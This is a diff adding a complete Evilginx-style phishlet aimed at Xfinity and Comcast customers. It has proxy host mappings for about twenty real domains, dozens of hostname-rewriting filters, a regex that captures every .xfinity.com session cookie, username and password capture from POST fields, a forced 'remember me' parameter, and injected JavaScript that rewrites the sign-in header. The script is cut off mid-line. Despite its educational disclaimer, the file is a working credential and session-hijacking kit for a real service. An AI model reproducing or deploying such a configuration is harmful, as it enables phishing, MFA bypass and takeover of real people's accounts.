@@ -1,0 +1,171 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@an0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'home', orig_sub: 'home', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'internet', orig_sub: 'internet', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'xfinity.com', session: true, is_landing: false}  
+  - {phish_sub: 'customer', orig_sub: 'customer', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'xfinity.com', session: true, is_landing: true}
+  - {phish_sub: 'dl.cws', orig_sub: 'dl.cws', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'cimcontent.net', session: true, is_landing: false}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'adobedtm.com', session: true, is_landing: false}
+  - {phish_sub: 'sdx', orig_sub: 'sdx', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'scripts', orig_sub: 'scripts', domain: 'webcontentassessor.com', session: true, is_landing: false}
+  - {phish_sub: 'my', orig_sub: 'my', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'edge.myriad-xcr.xcr', orig_sub: 'edge.myriad-xcr.xcr', domain: 'comcast.net', session: true, is_landing: false}
+  - {phish_sub: 'polaris', orig_sub: 'polaris', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'oauth', orig_sub: 'oauth', domain: 'xfinity.com', session: true, is_landing: false}  
+  - {phish_sub: 'melee.sed.dh', orig_sub: 'melee.sed.dh', domain: 'comcast.net', session: true, is_landing: false}
+  - {phish_sub: 'xfinityconnect.email', orig_sub: 'xfinityconnect.email', domain: 'comcast.net', session: true, is_landing: false, auto_filter: false}   
+  - {phish_sub: 'business', orig_sub: 'business', domain: 'comcast.com', session: true, is_landing: false, auto_filter: false}   
+
+
+ # https://business.comcast.com/?utm_source=dotnet&utm_campaign=UniSlimNav0314SlimNavMYX&utm_medium=SlimNav
+# https://xfinityconnect.email.comcast.net/ 
+sub_filters:
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'customer', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'customer', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'customer', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'sdx', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'sdx', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'sdx', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'my', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'my', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'my', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'polaris', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'polaris', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'polaris', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'auth', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'auth', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'auth', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'www', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'www', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'www', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'dl.cws', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'dl.cws', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'dl.cws', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'static', domain: 'cimcontent.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'static', domain: 'cimcontent.net', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'static', domain: 'cimcontent.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'melee.sed.dh', domain: 'comcast.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'melee.sed.dh', domain: 'comcast.net', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'melee.sed.dh', domain: 'comcast.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'edge.myriad-xcr.xcr', domain: 'comcast.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'edge.myriad-xcr.xcr', domain: 'comcast.net', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'edge.myriad-xcr.xcr', domain: 'comcast.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'assets', domain: 'adobedtm.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'scripts', domain: 'webcontentassessor.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'scripts', domain: 'webcontentassessor.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.xfinity.com', orig_sub: 'scripts', domain: 'webcontentassessor.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'customer', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'customer', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'customer', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'sdx', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'sdx', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'sdx', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'my', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'my', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'my', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'polaris', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'polaris', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'polaris', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'auth', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'auth', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'auth', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'www', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'www', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'www', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'dl.cws', domain: 'xfinity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'dl.cws', domain: 'xfinity.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'dl.cws', domain: 'xfinity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'static', domain: 'cimcontent.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'static', domain: 'cimcontent.net', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'static', domain: 'cimcontent.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'melee.sed.dh', domain: 'comcast.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'melee.sed.dh', domain: 'comcast.net', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'melee.sed.dh', domain: 'comcast.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'edge.myriad-xcr.xcr', domain: 'comcast.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'edge.myriad-xcr.xcr', domain: 'comcast.net', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'edge.myriad-xcr.xcr', domain: 'comcast.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'assets', domain: 'adobedtm.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'scripts', domain: 'webcontentassessor.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'scripts', domain: 'webcontentassessor.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'scripts', domain: 'webcontentassessor.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'business', domain: 'comcast.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'business', domain: 'comcast.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'business', domain: 'comcast.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'xfinityconnect.email', domain: 'comcast.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'xfinityconnect.email', domain: 'comcast.net', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'my.xfinity.com', orig_sub: 'xfinityconnect.email', domain: 'comcast.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+   
+auth_tokens:
+  - domain: '.xfinity.com'
+    keys: ['.*,regexp']    
+auth_urls:
+  - '/'
+
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+force_post:
+  - path: '/login '
+    search:
+      - {key: 'user', search: '.*'}
+      - {key: 'passwd', search: '.*'}
+    force:
+      - {key: 'rm', value: '1'}
+    type: 'post'    
+login:
+  domain: 'my.xfinity.com'
+  path: '/'
+  
+js_inject:
+  - trigger_domains: ["my.xfinity.com"]
+    trigger_paths: ["/"]
+    trigger_params: [domain]
+    script: |
+      function lp(){
+        var elem1 = document.getElementsByClassName("xc-header--signin-container")[0];
+        elem1.parentNode.removeChild(elem1); 
+        var div = document.createElement('div');
+        div.className = 'xc-header--signin-container xc-unrecognized';
+        div.innerHTML = `
+        <span class="xc-header--authmethod-text"></span> <a class="xc-header--signin-link" href="https://auth.{domain}/oauth/login?state=https%3A%2F%2Fcustomer.{domain}%2F%23%2F%3FCMP%3DILC_signin_myxfinity_re">Sign In</a><div class="xc-header--signin-container--authenticated"><div class="xc-header--notification-count--container" hidden=""><svg focusable="false" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M14 12v1H0v-1l.73-.58c.77-.77.81-2.55 1.19-4.42C2.69 3.23 6 2 6 2c0-.55.45-1 1-1s1 .45 1 1c0 0 3.39 1.23 4.16 5 .38 1.88.42 3.66 1.19 4.42l.66.58H14zm-7 4c1.11 0 2-.89 2-2H5c0 1.11.89 2 2 2z"></path></svg><div class="xc-header--notification-count"></div></div><a class="xc-header--mobile-signout xc-header--signin-signout-link" href="https://oauth.{domain}/oauth/sp-logout?client_id=my-xfinity">Sign Out</a><div class="xc-header--dropdown-container"><button class="xc-header--signin-profile-name" aria-haspopup="true" aria-expanded="false"></button> <button class="xc-header--dropdown-btn" 
